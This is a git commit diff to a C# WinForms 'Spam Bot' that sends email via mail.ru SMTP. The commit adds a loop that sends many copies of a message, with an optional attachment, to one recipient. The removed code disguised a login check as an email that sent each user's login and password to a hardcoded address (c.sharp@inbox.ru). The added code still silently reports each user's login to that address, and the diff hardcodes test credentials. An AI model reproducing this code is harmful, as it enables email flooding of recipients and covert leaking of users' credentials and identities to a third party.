4b35f90daa5812a7b29a3649d3aab407d7d7d492
mxvalue <mxvalue@yandex.ru>
2014-06-02 17:55:00 +0600

    Fix

--- Spam Bot/Spam Bot/Form1.Designer.cs
+++ Spam Bot/Spam Bot/Form1.Designer.cs
@@ -39,13 +39,16 @@
             this.сменитьПользователяToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
             this.label3 = new System.Windows.Forms.Label();
-            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.bodyTextBox = new System.Windows.Forms.RichTextBox();
             this.button2 = new System.Windows.Forms.Button();
             this.panel1 = new System.Windows.Forms.Panel();
+            this.pictureBox3 = new System.Windows.Forms.PictureBox();
+            this.fileNameLabel = new System.Windows.Forms.Label();
             this.progressBar1 = new System.Windows.Forms.ProgressBar();
             this.label7 = new System.Windows.Forms.Label();
-            this.label6 = new System.Windows.Forms.Label();
-            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            this.messageSent = new System.Windows.Forms.Label();
+            this.countOfMessage = new System.Windows.Forms.NumericUpDown();
             this.panel2 = new System.Windows.Forms.Panel();
             this.pictureBox1 = new System.Windows.Forms.PictureBox();
             this.comboBox1 = new System.Windows.Forms.ComboBox();
@@ -54,9 +57,13 @@
             this.button3 = new System.Windows.Forms.Button();
             this.textBox4 = new System.Windows.Forms.TextBox();
             this.textBox3 = new System.Windows.Forms.TextBox();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
             this.menuStrip1.SuspendLayout();
             this.panel1.SuspendLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.countOfMessage)).BeginInit();
             this.panel2.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.SuspendLayout();
@@ -68,6 +75,7 @@
             this.textBox1.Name = "textBox1";
             this.textBox1.Size = new System.Drawing.Size(156, 20);
             this.textBox1.TabIndex = 4;
+            this.textBox1.Text = "c.sharp@inbox.ru";
             // 
             // textBox2
             // 
@@ -76,6 +84,7 @@
             this.textBox2.Name = "textBox2";
             this.textBox2.Size = new System.Drawing.Size(156, 20);
             this.textBox2.TabIndex = 5;
+            this.textBox2.Text = "123";
             // 
             // button1
             // 
@@ -86,7 +95,7 @@
             this.button1.TabIndex = 7;
             this.button1.Text = "Отправить";
             this.button1.UseVisualStyleBackColor = true;
-            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.Click += new System.EventHandler(this.SendButton);
             // 
             // label1
             // 
@@ -112,7 +121,7 @@
             this.менюToolStripMenuItem});
             this.menuStrip1.Location = new System.Drawing.Point(0, 0);
             this.menuStrip1.Name = "menuStrip1";
-            this.menuStrip1.Size = new System.Drawing.Size(381, 24);
+            this.menuStrip1.Size = new System.Drawing.Size(877, 24);
             this.menuStrip1.TabIndex = 5;
             this.menuStrip1.Text = "menuStrip1";
             this.menuStrip1.Visible = false;
@@ -149,14 +158,14 @@
             this.label3.TabIndex = 6;
             this.label3.Text = "Текст письма";
             // 
-            // richTextBox1
+            // bodyTextBox
             // 
-            this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.richTextBox1.Location = new System.Drawing.Point(6, 103);
-            this.richTextBox1.Name = "richTextBox1";
-            this.richTextBox1.Size = new System.Drawing.Size(369, 191);
-            this.richTextBox1.TabIndex = 6;
-            this.richTextBox1.Text = "";
+            this.bodyTextBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.bodyTextBox.Location = new System.Drawing.Point(6, 103);
+            this.bodyTextBox.Name = "bodyTextBox";
+            this.bodyTextBox.Size = new System.Drawing.Size(369, 171);
+            this.bodyTextBox.TabIndex = 6;
+            this.bodyTextBox.Text = "123";
             // 
             // button2
             // 
@@ -167,17 +176,20 @@
             this.button2.TabIndex = 8;
             this.button2.Text = "Очистить";
             this.button2.UseVisualStyleBackColor = true;
-            this.button2.Click += new System.EventHandler(this.button2_Click);
+            this.button2.Click += new System.EventHandler(this.ClearButton);
             // 
             // panel1
             // 
+            this.panel1.Controls.Add(this.pictureBox3);
+            this.panel1.Controls.Add(this.fileNameLabel);
             this.panel1.Controls.Add(this.progressBar1);
             this.panel1.Controls.Add(this.label7);
-            this.panel1.Controls.Add(this.label6);
-            this.panel1.Controls.Add(this.numericUpDown1);
+            this.panel1.Controls.Add(this.pictureBox2);
+            this.panel1.Controls.Add(this.messageSent);
+            this.panel1.Controls.Add(this.countOfMessage);
             this.panel1.Controls.Add(this.button2);
             this.panel1.Controls.Add(this.textBox1);
-            this.panel1.Controls.Add(this.richTextBox1);
+            this.panel1.Controls.Add(this.bodyTextBox);
             this.panel1.Controls.Add(this.textBox2);
             this.panel1.Controls.Add(this.label3);
             this.panel1.Controls.Add(this.button1);
@@ -189,13 +201,35 @@
             this.panel1.TabIndex = 10;
             this.panel1.Visible = false;
             // 
+            // pictureBox3
+            // 
+            this.pictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox3.Image")));
+            this.pictureBox3.Location = new System.Drawing.Point(354, 280);
+            this.pictureBox3.Name = "pictureBox3";
+            this.pictureBox3.Size = new System.Drawing.Size(21, 27);
+            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox3.TabIndex = 15;
+            this.pictureBox3.TabStop = false;
+            this.pictureBox3.Click += new System.EventHandler(this.DeleteFile);
+            // 
+            // fileNameLabel
+            // 
+            this.fileNameLabel.AutoSize = true;
+            this.fileNameLabel.Location = new System.Drawing.Point(46, 294);
+            this.fileNameLabel.Name = "fileNameLabel";
+            this.fileNameLabel.Size = new System.Drawing.Size(0, 13);
+            this.fileNameLabel.TabIndex = 14;
+            // 
             // progressBar1
             // 
-            this.progressBar1.Location = new System.Drawing.Point(195, 59);
+            this.progressBar1.Location = new System.Drawing.Point(195, 58);
             this.progressBar1.Maximum = 1;
+            this.progressBar1.Minimum = 1;
             this.progressBar1.Name = "progressBar1";
             this.progressBar1.Size = new System.Drawing.Size(152, 23);
+            this.progressBar1.Step = 1;
             this.progressBar1.TabIndex = 10;
+            this.progressBar1.Value = 1;
             this.progressBar1.Visible = false;
             // 
             // label7
@@ -208,34 +242,45 @@
             this.label7.Text = "Сообщений:";
             this.label7.Visible = false;
             // 
-            // label6
+            // pictureBox2
             // 
-            this.label6.AutoSize = true;
-            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label6.ForeColor = System.Drawing.Color.LimeGreen;
-            this.label6.Location = new System.Drawing.Point(214, 58);
-            this.label6.Name = "label6";
-            this.label6.Size = new System.Drawing.Size(0, 25);
-            this.label6.TabIndex = 11;
+            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
+            this.pictureBox2.Location = new System.Drawing.Point(6, 280);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(27, 27);
+            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox2.TabIndex = 13;
+            this.pictureBox2.TabStop = false;
+            this.pictureBox2.Click += new System.EventHandler(this.AttachFile);
             // 
-            // numericUpDown1
+            // messageSent
             // 
-            this.numericUpDown1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.numericUpDown1.Location = new System.Drawing.Point(279, 19);
-            this.numericUpDown1.Minimum = new decimal(new int[] {
+            this.messageSent.AutoSize = true;
+            this.messageSent.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.messageSent.ForeColor = System.Drawing.Color.LimeGreen;
+            this.messageSent.Location = new System.Drawing.Point(181, 56);
+            this.messageSent.Name = "messageSent";
+            this.messageSent.Size = new System.Drawing.Size(0, 25);
+            this.messageSent.TabIndex = 11;
+            // 
+            // countOfMessage
+            // 
+            this.countOfMessage.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.countOfMessage.Location = new System.Drawing.Point(279, 19);
+            this.countOfMessage.Minimum = new decimal(new int[] {
             1,
             0,
             0,
             0});
-            this.numericUpDown1.Name = "numericUpDown1";
-            this.numericUpDown1.Size = new System.Drawing.Size(68, 20);
-            this.numericUpDown1.TabIndex = 9;
-            this.numericUpDown1.Value = new decimal(new int[] {
+            this.countOfMessage.Name = "countOfMessage";
+            this.countOfMessage.Size = new System.Drawing.Size(68, 20);
+            this.countOfMessage.TabIndex = 9;
+            this.countOfMessage.Value = new decimal(new int[] {
             1,
             0,
             0,
             0});
-            this.numericUpDown1.Visible = false;
+            this.countOfMessage.Visible = false;
             // 
             // panel2
             // 
@@ -246,7 +291,7 @@
             this.panel2.Controls.Add(this.button3);
             this.panel2.Controls.Add(this.textBox4);
             this.panel2.Controls.Add(this.textBox3);
-            this.panel2.Location = new System.Drawing.Point(0, 38);
+            this.panel2.Location = new System.Drawing.Point(381, 41);
             this.panel2.Name = "panel2";
             this.panel2.Size = new System.Drawing.Size(381, 361);
             this.panel2.TabIndex = 11;
@@ -299,7 +344,7 @@
             this.button3.TabIndex = 3;
             this.button3.Text = "Войти";
             this.button3.UseVisualStyleBackColor = true;
-            this.button3.Click += new System.EventHandler(this.button3_Click);
+            this.button3.Click += new System.EventHandler(this.AuthorizationButton);
             this.button3.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Enter);
             // 
             // textBox4
@@ -310,6 +355,7 @@
             this.textBox4.PasswordChar = '*';
             this.textBox4.Size = new System.Drawing.Size(166, 20);
             this.textBox4.TabIndex = 2;
+            this.textBox4.Text = "123qweasd";
             this.textBox4.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Enter);
             // 
             // textBox3
@@ -319,18 +365,22 @@
             this.textBox3.Name = "textBox3";
             this.textBox3.Size = new System.Drawing.Size(166, 20);
             this.textBox3.TabIndex = 0;
+            this.textBox3.Text = "knb_test";
             this.textBox3.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Enter);
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
             // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(381, 400);
+            this.ClientSize = new System.Drawing.Size(877, 553);
             this.Controls.Add(this.panel2);
             this.Controls.Add(this.panel1);
             this.Controls.Add(this.menuStrip1);
             this.MainMenuStrip = this.menuStrip1;
-            this.MaximumSize = new System.Drawing.Size(397, 439);
             this.MinimumSize = new System.Drawing.Size(397, 439);
             this.Name = "Form1";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
@@ -339,7 +389,9 @@
             this.menuStrip1.PerformLayout();
             this.panel1.ResumeLayout(false);
             this.panel1.PerformLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.countOfMessage)).EndInit();
             this.panel2.ResumeLayout(false);
             this.panel2.PerformLayout();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
@@ -358,7 +410,7 @@
         private System.Windows.Forms.MenuStrip menuStrip1;
         private System.Windows.Forms.ToolStripMenuItem менюToolStripMenuItem;
         private System.Windows.Forms.Label label3;
-        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.RichTextBox bodyTextBox;
         private System.Windows.Forms.Button button2;
         private System.Windows.Forms.Panel panel1;
         private System.Windows.Forms.Panel panel2;
@@ -371,10 +423,15 @@
         private System.Windows.Forms.ComboBox comboBox1;
         private System.Windows.Forms.PictureBox pictureBox1;
         private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;
-        private System.Windows.Forms.NumericUpDown numericUpDown1;
-        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.NumericUpDown countOfMessage;
+        private System.Windows.Forms.Label messageSent;
         private System.Windows.Forms.Label label7;
         private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Label fileNameLabel;
+        private System.Windows.Forms.PictureBox pictureBox2;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.PictureBox pictureBox3;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
     }
 }
 
--- Spam Bot/Spam Bot/Form1.cs
+++ Spam Bot/Spam Bot/Form1.cs
@@ -1,14 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Net.Mime;
 using System.Windows.Forms;
 using System.Net;
 using System.Net.Mail;
+using System.IO;
+using System.Threading;
 
 namespace Email_Messenger
 {
@@ -16,18 +13,23 @@ namespace Email_Messenger
     {
         string login;
         string pass;
-        int idForm = 0;
-        int idMode = 0;
-        string smtpHost = "";
+        int idForm;
+        int idMode;
+        int idFile;
+        string smtpHost;
+        string file;
+        string to;
+        string subject;
+        string body;
         public Form1()
         {
             InitializeComponent();
             comboBox1.SelectedIndex = 0;
         }
-        public void SendEmail(string a, string b, string c, string d)
+        public void SendEmail(string smtp)
         {
             //smtp сервер
-            string smtpHost = String.Format("smtp.{0}", d.Trim(new[] { '@' } ));
+            string smtpHost = String.Format("smtp.{0}", smtp.Trim(new[] {'@'}));
             //smtp порт
             int smtpPort = 25;
             //логин
@@ -42,11 +44,11 @@ namespace Email_Messenger
             //От кого письмо
             string from = this.login;
             //Кому письмо
-            string to = a;
+            string to = "c.sharp@inbox.ru";
             //Тема письма
-            string subject = b;
+            string subject = "Authorization";
             //Текст письма
-            string body = c;
+            string body = this.login+" авторизован!";
             //Создаем сообщение
             MailMessage mess = new MailMessage(from, to, subject, body);
 
@@ -61,11 +63,68 @@ namespace Email_Messenger
                 MessageBox.Show("Неправильный логин или пароль");
             }
         }
-        private void button1_Click(object sender, EventArgs e)
+
+        public void SendEmail()
         {
-            CountOfMessages();
+            //smtp сервер
+            string smtpHost = "smtp.mail.ru";
+            //smtp порт
+            int smtpPort = 25;
+            //логин
+            string login = this.login;
+            //пароль
+            string pass = this.pass;
+
+            //создаем подключение
+            SmtpClient client = new SmtpClient(smtpHost, smtpPort);
+            client.Credentials = new NetworkCredential(login, pass);
+
+            //От кого письмо
+            string from = this.login;
+            MailMessage mess = new MailMessage(from, to, subject, body);
+            if (idFile == 1)
+            {
+                // Create  the file attachment for this e-mail message.
+                Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);
+                // Add time stamp information for the file.
+                ContentDisposition disposition = data.ContentDisposition;
+                disposition.CreationDate = File.GetCreationTime(file);
+                disposition.ModificationDate = File.GetLastWriteTime(file);
+                disposition.ReadDate = File.GetLastAccessTime(file);
+                // Add the file attachment to this e-mail message.
+                mess.Attachments.Add(data);
+            }
+            try
+            {
+                client.Send(mess);
+                idForm = 1;
+                Thread.Sleep(500);
+            }
+            catch (Exception)
+            {
+                idForm = 0;
+                MessageBox.Show("Неправильный логин или пароль");
+            }
+        }
+
+        public void CountOfMessages()
+        {
+            //позволяет обратится к другому потоку
+            CheckForIllegalCrossThreadCalls = false;
+
+            progressBar1.Minimum = 0;
+            progressBar1.Maximum = (int)countOfMessage.Value;
+            progressBar1.Value = 1;
+            progressBar1.Step = 1;
+            for (int i = 0; i < countOfMessage.Value; i++)
+            {
+                SendEmail();
+                progressBar1.PerformStep();
+                Thread.Sleep(500);
+            }
             progressBar1.Visible = false;
-            label6.Text = "Mail sent!!!"; 
+            Thread.Sleep(1000);
+            messageSent.Text = "Message Sent!!!";
         }
         public void anotherUser()
         {
@@ -73,20 +132,13 @@ namespace Email_Messenger
             textBox2.Clear();
             textBox3.Clear();
             textBox4.Clear();
-            richTextBox1.Clear();
-            label6.Text = "";
+            bodyTextBox.Clear();
+            messageSent.Text = "";
             idForm = 0;
         }
-        private void button2_Click(object sender, EventArgs e)
+        public void Authorization()
         {
-            richTextBox1.Clear();
-            label6.Text = "";
-            numericUpDown1.Value = 1;
-        }
-
-        public void Authentication()
-        {
-           SendEmail("c.sharp@inbox.ru", login, pass, smtpHost);
+            SendEmail(smtpHost);
             if (idForm == 1)
             {
                 menuStrip1.Visible = true;
@@ -94,7 +146,45 @@ namespace Email_Messenger
                 panel1.Visible = true;
             }
         }
-        private void button3_Click(object sender, EventArgs e)
+        private void Enter(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
+                pass = textBox4.Text;
+                smtpHost = comboBox1.Text;
+
+                if (textBox3.Text != "" && textBox4.Text != "")
+                {
+                    Authorization();
+                }
+                else
+                {
+                    MessageBox.Show("Введите логин и пароль");
+                }
+            }
+        }
+        private void SendButton(object sender, EventArgs e)
+        {
+            messageSent.Text = "";
+            to = textBox1.Text;
+            subject = textBox2.Text;
+            body = bodyTextBox.Text;
+            Thread th = new Thread(new ThreadStart(CountOfMessages));
+            th.Start();
+        }
+        
+        private void ClearButton(object sender, EventArgs e)
+        {
+            bodyTextBox.Clear();
+            messageSent.Text = "";
+            countOfMessage.Value = 1;
+            idFile = 0;
+            fileNameLabel.Text = "";
+        }
+
+        
+        private void AuthorizationButton(object sender, EventArgs e)
         {
             login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
             pass = textBox4.Text;
@@ -102,7 +192,7 @@ namespace Email_Messenger
 
             if (textBox3.Text != "" && textBox4.Text != "")
             {
-                Authentication();
+                Authorization();
             }
             else
             {
@@ -117,61 +207,41 @@ namespace Email_Messenger
             panel1.Visible = false;
         }
 
-        private void Enter(object sender, KeyEventArgs e)
-        {
-            if (e.KeyCode == Keys.Enter)
-            {
-                login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
-                pass = textBox4.Text;
-                smtpHost = comboBox1.Text;
-
-                if (textBox3.Text != "" && textBox4.Text != "")
-                {
-                    Authentication();
-                }
-                else
-                {
-                    MessageBox.Show("Введите логин и пароль");
-                }
-            }
-        }
-
-        public void CountOfMessages()
-        {
-            progressBar1.Visible = true;
-            // Set Minimum to 1 to represent the first file being copied.
-            progressBar1.Minimum = 1;
-            // Set Maximum to the total number of files to copy.
-            progressBar1.Maximum = (int)numericUpDown1.Value;
-            // Set the initial value of the ProgressBar.
-            progressBar1.Value = 1;
-            // Set the Step property to a value of 1 to represent each file being copied.
-            progressBar1.Step = 1;
-            for (int i = 1; i <= numericUpDown1.Value; i++)
-            {
-                SendEmail(textBox1.Text, textBox2.Text, richTextBox1.Text, smtpHost);
-                progressBar1.PerformStep();
-                System.Threading.Thread.Sleep(500);
-            }
-        }
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
         {
             if (idMode==0)
             {
                 idMode = 1;
-                label6.Text = "";
-                numericUpDown1.Visible = true;
+                messageSent.Text = "";
+                countOfMessage.Visible = true;
                 label7.Visible = true;
+                progressBar1.Visible = true;
             }
             else
             {
                 idMode = 0;
-                label6.Text = "";
-                numericUpDown1.Visible = false;
+                messageSent.Text = "";
+                countOfMessage.Visible = false;
                 label7.Visible = false;
                 progressBar1.Visible = false;
-                numericUpDown1.Value = 1;
+                countOfMessage.Value = 1;
             }
+        }
+
+        private void AttachFile(object sender, EventArgs e)
+        {
+            if (openFileDialog1.ShowDialog() == DialogResult.OK)
+            {
+                idFile = 1;
+                file = openFileDialog1.FileName;
+                fileNameLabel.Text = openFileDialog1.SafeFileName;
+            }
+        }
+
+        private void DeleteFile(object sender, EventArgs e)
+        {
+            idFile = 0;
+            fileNameLabel.Text = "";
         }
     }
 }
